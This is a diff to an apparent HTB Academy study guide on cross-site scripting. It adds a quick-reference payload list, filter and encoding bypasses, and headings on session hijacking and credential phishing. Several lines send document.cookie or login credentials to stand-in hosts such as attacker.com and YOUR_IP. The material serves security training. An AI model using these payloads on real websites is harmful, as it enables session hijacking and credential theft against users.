@@ -1,5 +1,67 @@
 # Cross-Site Scripting (XSS) - HTB Academy Guide
 
+> Complete XSS exploitation guide covering all attack types, payloads, and HTB Academy lab solutions
+
+## 📚 Table of Contents
+
+### Core Concepts
+- **[Overview](#overview)** - XSS fundamentals and impact
+- **[Types of XSS](#types-of-xss-vulnerabilities)** - Stored, Reflected, DOM-based
+- **[Basic Payloads](#basic-xss-testing-payloads)** - Standard testing payloads
+- **[Alternative Payloads](#alternative-payloads)** - Bypass techniques when `<script>` is blocked
+
+### Attack Techniques
+- **[XSS Discovery](#xss-discovery-methods)** - Automated and manual detection
+- **[Session Hijacking](#session-hijacking--cookie-stealing)** - Cookie theft and account takeover
+- **[Credential Harvesting](#credential-harvesting--phishing-attack)** - Phishing attacks via XSS
+- **[Blind XSS](#blind-xss-detection)** - Admin panel and hidden XSS exploitation
+
+### Practical Labs
+- **[HTB Academy Labs](#htb-academy-lab-solutions)** - Complete lab solutions and walkthroughs
+- **[Troubleshooting](#xss-troubleshooting--common-mistakes)** - Common issues and fixes
+- **[Tools & Resources](#tools-and-resources)** - Professional XSS testing toolkit
+
+### Defense
+- **[Prevention](#detection-and-mitigation)** - Secure coding and mitigation techniques
+
+---
+
+## Quick Reference
+
+### 🎯 **Essential XSS Payloads**
+```html
+<!-- Basic Test -->
+<script>alert(1)</script>
+
+<!-- Cookie Stealing -->
+<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>
+
+<!-- Phishing Form -->
+'><script>document.write('<h3>Please login</h3><form action=http://attacker.com><input name="user"><input type="password" name="pass"><input type="submit" value="Login"></form>');</script><!--
+
+<!-- Bypass Script Blocking -->
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+```
+
+### 🔍 **XSS Detection Flow**
+1. **Find input points** → Forms, URL params, headers
+2. **Test basic payload** → `<script>alert(1)</script>`
+3. **Check page source** → Look for payload reflection
+4. **Verify execution** → Confirm JavaScript runs
+5. **Exploit discovered XSS** → Session hijacking, phishing
+
+### 🎯 **HTB Academy Coverage**
+- ✅ **All XSS Types** - Stored, Reflected, DOM-based XSS
+- ✅ **Session Hijacking** - Cookie stealing and account takeover
+- ✅ **Phishing Attacks** - Credential harvesting via fake forms
+- ✅ **Blind XSS** - Admin panel exploitation techniques
+- ✅ **Bypass Techniques** - Filter evasion and encoding methods
+- ✅ **Complete Labs** - Step-by-step HTB Academy solutions
+
+---
+
 ## Overview
 
 Cross-Site Scripting (XSS) is a web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS occurs when user input is not properly sanitized and gets executed as JavaScript code in the victim's browser.
@@ -157,22 +219,51 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 <script>$.getScript("http://attacker.com/fieldname")</script>
 ```
 
-**Alternative Payloads (when <script> is blocked):**
+---
+
+## Alternative Payloads
+
+> Bypass techniques when `<script>` tags are blocked by filters
+
+### When `<script>` is Blocked
+
+**Image onerror event:**
 ```html
-<!-- Image onerror event -->
 <img src="" onerror=alert(window.origin)>
+<img src=x onerror=alert(document.cookie)>
+```
+
+**SVG payload:**
+```html
+<svg onload=alert(window.origin)>
+<svg/onload=alert(1)>
+```
+
+**Input onfocus:**
+```html
+<input autofocus onfocus=alert(window.origin)>
+<input onfocus=alert(1) autofocus>
+```
+
+**Iframe JavaScript:**
+```html
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(window.origin)">
+```
+
+**Other HTML5 elements:**
+```html
+<!-- Body onload -->
+<body onload=alert(1)>
+
+<!-- Div onmouseover -->
+<div onmouseover=alert(1)>
 
 <!-- Plaintext rendering -->
 <plaintext>
 
 <!-- Print dialog -->
 <script>print()</script>
-
-<!-- SVG payload -->
-<svg onload=alert(window.origin)>
-
-<!-- Input onfocus -->
-<input autofocus onfocus=alert(window.origin)>
 ```
 
 ### Advanced Payloads
@@ -191,16 +282,35 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 <script>eval('alert\u00281\u0029')</script>
 ```
 
-**Encoded Payloads:**
+### Encoding Bypass Techniques
+
+**URL Encoding:**
 ```html
-<!-- URL encoding -->
 %3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+```
 
-<!-- HTML entities -->
+**HTML Entities:**
+```html
 &lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+```
 
-<!-- Unicode encoding -->
+**Unicode Encoding:**
+```html
 <script>alert('\u0058\u0053\u0053')</script>
+<script>alert('\x58\x53\x53')</script>
+```
+
+**Double Encoding:**
+```html
+%253Cscript%253Ealert(1)%253C/script%253E
+```
+
+**Mixed Case:**
+```html
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
 ```
 
 ---
@@ -277,9 +387,13 @@ filter_var()
 
 ---
 
+---
+
 ## Common XSS Attack Scenarios
 
 ### 1. Session Hijacking & Cookie Stealing
+
+> **💀 Critical Attack:** Steal authentication cookies to hijack user sessions without knowing passwords
 
 **Overview:**
 Session hijacking allows attackers to steal user authentication cookies through XSS, gaining unauthorized access to victim accounts without knowing their credentials.
@@ -403,7 +517,11 @@ xhr.open('GET', 'http://YOUR_IP/steal.php?cookie='+document.cookie);
 xhr.send();
 ```
 
+---
+
 ### 2. Credential Harvesting & Phishing Attack
+
+> **🎣 Social Engineering:** Create fake login forms to steal usernames and passwords
 
 **Basic Fake Login Form:**
 ```html
